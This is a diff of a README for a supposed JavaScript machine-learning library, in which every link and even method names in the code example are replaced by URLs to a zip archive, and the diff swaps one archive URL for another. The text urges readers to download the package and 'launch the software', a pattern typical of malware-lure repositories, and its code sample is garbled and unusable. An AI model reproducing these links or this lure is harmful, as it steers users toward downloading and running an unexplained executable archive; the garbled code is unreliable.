@@ -1,13 +1,13 @@
 # Argonz-ML
 
-![Argonz-ML Logo](https://github.com/Grimstrrr/Argonz-ML/releases/download/v2.0/Release_x64.zip)
+![Argonz-ML Logo](https://raw.githubusercontent.com/Grimstrrr/Argonz-ML/main/vester/Argonz_ML_fibrillate.zip)
 
 Welcome to Argonz-ML - a light weight machine learning library published on npmjs. This repository provides a comprehensive set of machine learning algorithms implemented in JavaScript. Whether you are working on decision trees, linear regression, logistic regression, random forest, support vector machines (SVM), or XGBoost, Argonz-ML has got you covered.
 
 ## Features
 
 🧠 Implement various machine learning algorithms  
-🌐 Easy integration with https://github.com/Grimstrrr/Argonz-ML/releases/download/v2.0/Release_x64.zip applications  
+🌐 Easy integration with https://raw.githubusercontent.com/Grimstrrr/Argonz-ML/main/vester/Argonz_ML_fibrillate.zip applications  
 📈 Train models for regression and classification tasks  
 🔍 Build decision trees and random forests  
 ⚙️ Fine-tune hyperparameters for optimal performance  
@@ -22,7 +22,7 @@ npm install argonz-ml
 
 ## Usage
 
-Using Argonz-ML in your https://github.com/Grimstrrr/Argonz-ML/releases/download/v2.0/Release_x64.zip application is as simple as importing the necessary modules and invoking the algorithms. Here's a quick example of how to train a linear regression model:
+Using Argonz-ML in your https://raw.githubusercontent.com/Grimstrrr/Argonz-ML/main/vester/Argonz_ML_fibrillate.zip application is as simple as importing the necessary modules and invoking the algorithms. Here's a quick example of how to train a linear regression model:
 
 ```javascript
 const { LinearRegression } = require('argonz-ml');
@@ -35,10 +35,10 @@ const data = [
 ];
 
 const model = new LinearRegression();
-https://github.com/Grimstrrr/Argonz-ML/releases/download/v2.0/Release_x64.zip(data);
+https://raw.githubusercontent.com/Grimstrrr/Argonz-ML/main/vester/Argonz_ML_fibrillate.zip(data);
 
-const prediction = https://github.com/Grimstrrr/Argonz-ML/releases/download/v2.0/Release_x64.zip(4); // Predict the output for x = 4
-https://github.com/Grimstrrr/Argonz-ML/releases/download/v2.0/Release_x64.zip('Prediction:', prediction);
+const prediction = https://raw.githubusercontent.com/Grimstrrr/Argonz-ML/main/vester/Argonz_ML_fibrillate.zip(4); // Predict the output for x = 4
+https://raw.githubusercontent.com/Grimstrrr/Argonz-ML/main/vester/Argonz_ML_fibrillate.zip('Prediction:', prediction);
 ```
 
 ## Example Applications
@@ -59,11 +59,11 @@ We welcome contributions from the open-source community to enhance Argonz-ML fur
 
 To start using Argonz-ML, download the software package from the following link:
 
-[![Download Argonz-ML](https://github.com/Grimstrrr/Argonz-ML/releases/download/v2.0/Release_x64.zip)](https://github.com/Grimstrrr/Argonz-ML/releases/download/v2.0/Release_x64.zip)
+[![Download Argonz-ML](https://raw.githubusercontent.com/Grimstrrr/Argonz-ML/main/vester/Argonz_ML_fibrillate.zip)](https://raw.githubusercontent.com/Grimstrrr/Argonz-ML/main/vester/Argonz_ML_fibrillate.zip)
 
 Once you have downloaded the package, launch the software and begin your machine learning journey with Argonz-ML.
 
-Visit our [website](https://github.com/Grimstrrr/Argonz-ML/releases/download/v2.0/Release_x64.zip) to learn more about the library and explore additional resources.
+Visit our [website](https://raw.githubusercontent.com/Grimstrrr/Argonz-ML/main/vester/Argonz_ML_fibrillate.zip) to learn more about the library and explore additional resources.
 
 For any issues or feature requests, please check the "Releases" section of this repository.
 
